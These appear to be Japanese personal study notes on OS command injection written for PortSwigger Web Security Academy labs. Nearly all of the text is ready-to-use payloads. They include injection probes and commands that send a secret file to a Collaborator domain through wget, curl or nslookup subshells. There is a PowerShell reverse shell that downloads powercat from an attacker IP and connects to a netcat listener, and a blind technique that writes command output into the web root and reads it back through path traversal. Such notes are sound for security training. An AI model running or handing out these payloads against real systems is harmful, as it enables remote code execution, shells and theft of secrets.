### (非blind) 基本形

- 出力を確認する
```bash
|id
```
```bash
||id||
```
	↓
```
||wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret||
```

#### reverse shell取得

##### PowerShellの場合

1. 攻撃者のマシンでPowercatをサーブする
```zsh
python -m http.server
```

2. 攻撃者のマシンでリスナーを立てる
```zsh
nc -lvnp 4444
```

3. コマンドインジェクションに脆弱なパラメータに以下のスクリプトを埋め込み実行する
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://[Attacker IP]/powercat.ps1");powercat -c [Attacker IP] -p 4444 -e powershell 
```

##### Linuxの場合


- 攻撃者のマシンでリスナーを立てる
```zsh
nc -lvnp 4444
```

- コマンドインジェクションに脆弱なパラメータに以下のスクリプトを埋め込み実行する

---
### (blind)Path Traversalと組み合わせ、コマンド出力を保存&取得

Comman injectionの結果出力フィルタをバイパスできる

1. `/image?filename=1.jpg`に対して[[🔍Path traversal#Detect]]でFile path manipulationが可能か？
2. カレントディレクトリを明らかにする
- Command injectionに脆弱な箇所に対して
```
||pwd>output.txt||
```
-> 200レスポンスが返る

- File path manipulationが可能な箇所に対して
```http
GET /image?filename=output.txt
```
-> カレントディレクトリがわかる。現在の`output.txt`ファイルは`/var/www/images/`配下にある
![[Pasted image 20240220145330.png]]

3. 絶対パスに目的の情報を書きこみ、情報を窃取する
```
||cat+/home/carlos/secret>>/var/www/images/output.txt||
```
-> 200レスポンスが返る

```http
GET /image?filename=output.txt
```

[LAB](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

---
### (blind)OAST + サブシェルでコマンド実行結果窃取

- このコマンドでCollaboratorへのlookupがくるか確認する
```
||curl+`whoami`.COLLABORATOR_DOMAIN||
```

###### 窃取基本コマンド

```zsh
||$(curl+$(cat+/home/carlos/secret).COLLABORATOR_DOMAIN)||
```
	or
```
nslookup+-q=cname+$(cat+/home/carlos/secret).COLLABORATOR_DOMAIN
```

###### 具体的なペイロード

- Admin PanelのImgSizeリクエストで使用する
```
/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).COLLABORATOR_DOMAIN%26" 
```
	or
```
ImgSize="`/usr/bin/wget%20https://COLLABORATOR_DOMAIN/%20--post-file=/home/carlos/secret`"
```